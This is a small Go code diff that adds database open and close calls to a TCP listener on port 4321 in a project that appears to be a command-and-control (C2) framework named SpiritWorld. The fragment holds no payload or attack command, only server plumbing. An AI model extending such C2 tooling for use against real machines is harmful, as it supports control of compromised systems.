@@ -3,10 +3,14 @@ package tcp
 import (
 	"fmt"
 	"net"
+
+	"github.com/f1rehaz4rd/SpiritWorld/c2/pkg/database"
 )
 
 // SERVADDR is the server port number
 const SERVADDR = "0.0.0.0:4321"
+
+var db database.DatabaseModel
 
 //
 // handleConnection from the TCP listener
@@ -36,6 +40,9 @@ func StartListener() {
 
 	fmt.Println("Starting TCP listener on " + SERVADDR)
 	defer listener.Close()
+
+	db.Open()
+	defer db.Close()
 
 	for {
 		conn, err := listener.Accept()
